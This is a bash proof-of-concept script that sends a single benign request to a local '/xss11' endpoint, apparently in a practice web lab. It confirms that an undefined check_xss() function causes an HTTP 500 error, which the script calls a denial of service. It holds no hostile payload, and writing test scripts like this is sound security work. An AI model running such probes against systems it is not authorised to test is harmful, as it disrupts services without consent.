#!/bin/bash

# POC: Undefined Function causing DoS on /xss11 Endpoint
# Description: Triggers NameError exception due to undefined check_xss() function
# Expected: HTTP 500 Internal Server Error with NameError in response

TARGET_URL="http://localhost:5001/xss11"
PAYLOAD="name=test"

echo "[*] Testing /xss11 endpoint for undefined function vulnerability..."
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# Make request to /xss11 endpoint
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL?$PAYLOAD")

# Extract HTTP status code (last line)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)

# Extract response body (all but last line)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""
echo "[*] Response Body:"
echo "$BODY"
echo ""

# Check for NameError indication
if echo "$BODY" | grep -qi "NameError\|check_xss\|not defined"; then
    echo "[+] VULNERABILITY CONFIRMED: NameError detected in response"
    echo "[+] Undefined function 'check_xss' is causing 500 error"
    exit 0
elif [ "$HTTP_CODE" == "500" ]; then
    echo "[+] VULNERABILITY CONFIRMED: HTTP 500 Internal Server Error"
    echo "[+] Endpoint is non-functional (Denial of Service)"
    exit 0
else
    echo "[-] Expected HTTP 500 but got: $HTTP_CODE"
    echo "[-] Vulnerability not confirmed or endpoint fixed"
    exit 1
fi